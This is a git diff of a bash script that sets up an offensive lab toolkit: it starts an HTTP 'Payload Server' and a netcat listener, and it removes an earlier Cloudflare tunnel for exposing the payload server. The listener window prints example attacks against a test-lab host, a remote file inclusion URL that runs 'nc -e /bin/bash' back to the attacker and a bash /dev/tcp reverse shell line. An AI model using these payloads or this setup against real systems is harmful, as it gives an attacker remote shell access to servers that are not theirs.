@@ -2,12 +2,6 @@
 sudo apt update
 sudo apt install xterm
 sudo apt install python3
-if ! command -v cloudflared &> /dev/null; then
-    echo -e "${RED}[!] cloudflared not found, installing...${NC}"
-    wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
-    sudo dpkg -i cloudflared-linux-amd64.deb
-    rm cloudflared-linux-amd64.deb
-fi
 cd ..;cd ..;cd ..;cd ..;
 cd X || mkdir X && cd X
 clear
@@ -52,19 +46,12 @@ check_port() {
 check_port $HTTP_PORT
 check_port $NC_PORT
 
-xterm -T "Payload Server" -geometry 80x30+0+0 -hold -e \
-"bash -c 'python3 -m http.server $HTTP_PORT & \
- sleep 2; \
- if command -v cloudflared &> /dev/null; then \
-    cloudflared tunnel --url http://localhost:$HTTP_PORT; \
- else \
-    echo -e \"${RED}[!] cloudflared not found ${NC}\"; \
- fi'" &
+xterm -T "Payload Server" -geometry 80x30+0+0 -hold -e "python3 -m http.server $HTTP_PORT" &
 
 xterm -T "NC Listener" -geometry 80x30+494+0 -hold -e \
 "echo -e '${GREEN}Listening...${NC}'; 
  echo '--------------------------------------------------';
- echo 'Example: http://ninja.testlab.local/index.php?page=https://random-name.trycloudflare.com/shell.txt?&cmd=nc -e /bin/bash 192.168.111.100 4444%00';
+ echo 'Example: http://ninja.testlab.local/index.php?page=http://192.168.111.100/shell.txt?&cmd=nc -e /bin/bash 192.168.111.100 4444%00';
  echo 'REV: bash -i >& /dev/tcp/$MY_IP/$NC_PORT 0>&1';
  echo '--------------------------------------------------';
  nc -lvp $NC_PORT" &
